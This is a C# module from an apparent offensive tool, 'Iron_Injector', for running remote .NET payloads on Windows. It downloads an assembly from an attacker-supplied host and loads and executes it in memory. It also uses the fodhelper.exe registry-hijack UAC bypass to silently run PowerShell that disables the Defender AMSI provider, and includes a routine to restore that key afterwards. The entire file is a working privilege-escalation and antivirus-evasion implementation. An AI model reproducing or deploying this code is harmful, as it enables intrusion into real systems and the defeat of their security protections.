using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Iron_Injector.API;
using Iron_Injector.Models.Abstracts;
using System.Runtime;
using Pastel;
using System.Drawing;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;

namespace Iron_Injector.Commands.Program_Commands
{
    public class ExecuteAssembly
    {
        public static string Url { get; set; }
        public static string ProgramName { get; set; }
        public static Dictionary<string, Assembly> assemList = new Dictionary<string, Assembly>();
        public static int retry = 0;

        public static void ExecuteASM()
        {

            Url = (ModuleBase.ModuleOptions.FirstOrDefault(u => u.Name.Equals("url", StringComparison.OrdinalIgnoreCase))).CurrentValue;
            ProgramName = (ModuleBase.ModuleOptions.FirstOrDefault(f => f.Name.Equals("programname", StringComparison.OrdinalIgnoreCase))).CurrentValue;

            byte[] assembly = downloadFile(Url, ProgramName);
            if (assembly == null)
            {
                return;
            }
            noMoreSpy();
            Thread.Sleep(5000); // just enough sleep for the noMoreSpy to really be finished before exe runs
            LoadInMemory(assembly);
        }

        public static byte[] downloadFile(string url, string filename)
        {
            try
            {
                byte[] programPayload;
                WebClient wc = new WebClient();
                programPayload = wc.DownloadData("http://" + url + "/" + filename);
                Console.WriteLine($"{"[+]".Pastel(Color.Green)} Downloaded {filename}");
                return programPayload;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return null;
            }
        }

        public static void LoadInMemory(byte[] payload)
        {
            string input;
            try
            {
                var asm = Assembly.Load(payload); // even with rasta AMSI bypass, AV flags here.
                if (assemList.ContainsKey(ProgramName) == false)
                {
                    assemList.Add(ProgramName, asm);
                }
                assemList.Select(i => $"{i.Key} {i.Value}").ToList().ForEach(Console.WriteLine);
                while (true)
                {
                    Console.Write($"[{ProgramName}]> ");
                    input = Console.ReadLine();

                    if (input == "exit")
                    {
                        break;
                    }
                    asm.EntryPoint.Invoke(null, new[] { $"{input}".Split() });
                }

            }
            catch (Exception ex)
            {
                return;
            }


        }

        public static void noMoreSpy()
        {
            Console.WriteLine("Fodhelper for the win?");
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\Command", true);
            Console.WriteLine("Created registry key");
            key.SetValue("DelegateExecute", "");
            key.SetValue("", @"cmd.exe /min /c powershell -windowstyle hidden New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse");
            Console.WriteLine("set key values");

            var p = new Process();
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "fodhelper.exe";
            bool didStart = p.Start();
            if (didStart == false)
            {
                Console.WriteLine("Fodhelper failed to start");
                return;
            }
            Console.WriteLine($"fodhelper activated at pid {p.Id} it that shall not be named should be dead, but will be reset once interactive prompt exits.");

            RegistryKey check = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\AMSI\Providers\", false);
            string[] subNames = check.GetSubKeyNames();

            foreach (var name in subNames)
            {
                var retrycount = 1;
                if (retry == retrycount)
                {
                    break;
                }
                if (name == "{2781761E-28E0-4109-99FE-B9D127C57AFE}")
                {
                    retry++;
                    Console.WriteLine("did not update key name");
                    noMoreSpy();
                }
            }
        }

        public static void fixSpy()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\Command", true);
            key.SetValue("DelegateExecute", "");
            key.SetValue("", @"cmd.exe /min /c powershell -windowstyle hidden New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Recurse");


            var p = new Process();
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "fodhelper.exe";
            p.Start();
            Console.WriteLine($"fodhelper activated at pid { p.Id} Fixed key back.");
        }

    }

}
